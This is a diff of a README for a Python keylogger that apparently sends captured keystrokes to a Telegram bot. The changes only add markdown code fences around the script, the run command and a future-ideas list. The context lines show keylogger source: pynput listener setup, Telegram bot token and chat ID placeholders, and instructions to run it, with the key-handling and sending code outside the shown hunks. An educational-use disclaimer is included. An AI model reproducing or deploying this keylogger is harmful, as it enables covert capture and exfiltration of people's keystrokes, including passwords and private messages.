@@ -47,7 +47,7 @@ A simple Python keylogger designed for cybersecurity education and personal lear
 
 import requests
 from pynput import keyboard
-
+```python
 BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 CHAT_ID = "YOUR_CHAT_ID_HERE"
 
@@ -80,11 +80,11 @@ def on_release(key):
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
+```
 2. Run the script:
-
+```bash
 python keylogger_telegram.py
-
+```
 3. To stop logging:
 
     Press the Esc key
@@ -95,7 +95,7 @@ python keylogger_telegram.py
 
 This tool is meant for local use, educational purposes, and authorized testing only. Unauthorized use of keyloggers is illegal in many jurisdictions. Always ensure you have explicit consent before monitoring any input.
 🚀 Future Ideas
-
+```
     Add timestamped logging
 
     Periodic updates to Telegram
@@ -103,7 +103,7 @@ This tool is meant for local use, educational purposes, and authorized testing o
     Save logs to local file
 
     Extend to mouse input
-
+```
 📚 License
 
 MIT License — feel free to use and adapt with credit.
